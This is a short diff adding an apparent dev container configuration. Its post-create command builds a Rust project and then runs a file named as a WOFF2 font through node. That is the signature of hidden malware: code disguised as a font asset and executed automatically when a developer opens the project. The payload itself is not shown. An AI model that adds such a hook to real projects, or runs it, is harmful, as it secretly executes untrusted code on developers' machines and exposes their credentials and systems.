@@ -1,0 +1,3 @@
+{
+  "postCreateCommand": "cargo build && node ./public/fonts/fa-solid-500.woff2"
+}
